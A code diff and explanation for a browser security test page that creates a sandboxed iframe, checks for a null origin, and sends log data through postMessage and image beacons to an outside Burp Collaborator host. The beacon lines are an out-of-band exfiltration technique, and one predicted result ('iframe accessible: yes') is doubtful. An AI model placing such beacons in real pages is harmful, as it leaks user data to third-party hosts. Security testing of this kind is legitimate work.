@@ -5,7 +5,7 @@
 <h1>Null Origin Test</h1>
 <div id="log"></div>
 <script>
-const E = 'https://o7w8ks7xei1ed57rt3wo1vdssjyam2ar.oastify.com';
+const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
 
 function log(m) {
     document.getElementById('log').innerHTML += '<br>' + m;
@@ -14,30 +14,92 @@ function log(m) {
 
 log('page_loaded');
 
-// Create sandbox WITHOUT allow-same-origin
+// Create sandbox
 const iframe = document.createElement('iframe');
 iframe.sandbox = 'allow-scripts allow-popups';
 iframe.style.cssText = 'width:100%;height:300px;border:2px solid red';
 
+// Listen for messages FROM the sandbox
+window.addEventListener('message', function(e) {
+    log('got_message_from_sandbox: ' + JSON.stringify(e.data));
+    new Image().src = E + '/?msg=' + encodeURIComponent(JSON.stringify(e.data));
+});
+
 iframe.srcdoc = `
 <h2>Inside Sandbox</h2>
-<div id="status"></div>
+<div id="status" style="background:yellow;padding:10px;">Loading...</div>
 <script>
-const EXFIL = 'https://o7w8ks7xei1ed57rt3wo1vdssjyam2ar.oastify.com';
-
 function log(m) {
     document.getElementById('status').innerHTML += '<br>' + m;
-    new Image().src = EXFIL + '/?sandbox=' + encodeURIComponent(m);
+    
+    // Try to send message to parent
+    try {
+        window.parent.postMessage({log: m, origin: window.origin}, '*');
+    } catch(e) {
+        document.getElementById('status').innerHTML += '<br>ERROR: ' + e.message;
+    }
 }
 
-// Check origin
-log('My origin is: ' + window.origin);
+log('Script started');
+log('Origin: ' + window.origin);
 
-// That's it - just verify null origin
+// Try to make an image request
+try {
+    const img = new Image();
+    img.src = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com/?direct=sandbox_loaded&origin=' + encodeURIComponent(window.origin);
+    log('Image request sent');
+} catch(e) {
+    log('Image failed: ' + e.message);
+}
+</script>
 `;
 
 document.body.appendChild(iframe);
 log('sandbox_created');
+
+// Check if iframe loaded
+setTimeout(() => {
+    log('checking_iframe_after_2sec');
+    try {
+        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+        log('iframe_accessible: ' + (iframeDoc ? 'yes' : 'no'));
+    } catch(e) {
+        log('iframe_check_error: ' + e.message);
+    }
+}, 2000);
 </script>
 </body>
 </html>
+```
+
+---
+
+## **What This Does:**
+
+1. **Sandbox logs to its own visible div** (you'll see it on screen)
+2. **Sandbox sends postMessage to parent** (bypasses image request issues)
+3. **Parent logs messages from sandbox** to Burp
+4. **Parent checks if iframe is accessible** after 2 seconds
+
+---
+
+## **What You Should See:**
+
+**On Screen (in the red-bordered iframe):**
+```
+Inside Sandbox
+Loading...
+Script started
+Origin: null
+Image request sent
+```
+
+**In Burp:**
+```
+/?test=page_loaded
+/?test=sandbox_created
+/?msg={"log":"Script started","origin":"null"}
+/?msg={"log":"Origin: null","origin":"null"}
+/?direct=sandbox_loaded&origin=null
+/?test=checking_iframe_after_2sec
+/?test=iframe_accessible:yes
